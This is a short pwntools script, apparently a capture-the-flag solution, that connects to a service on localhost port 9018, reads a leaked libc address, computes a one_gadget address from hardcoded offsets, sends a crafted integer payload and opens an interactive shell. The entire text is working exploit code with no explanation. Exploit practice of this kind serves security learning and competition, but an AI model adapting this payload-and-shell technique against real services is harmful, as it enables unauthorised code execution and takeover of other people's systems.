from pwn import *

_IO_2_1_stdout_ = 0x1b2d60
one_gadget = 0x3ac3b
one_gadget_offset = one_gadget - _IO_2_1_stdout_
sh = remote("localhost", 9018)
libc_leak = int(struct.unpack("I", sh.recv())[0])
print("[+] leak: " + str(hex(libc_leak)))
libc_one_gadget = libc_leak + one_gadget_offset
print("[+] one_gadget: " + str(hex(libc_one_gadget)))
payload = libc_one_gadget - 0xffffffff
print("[+] payload: " + str(hex(payload)))
sh.send(str(payload))
sh.interactive()


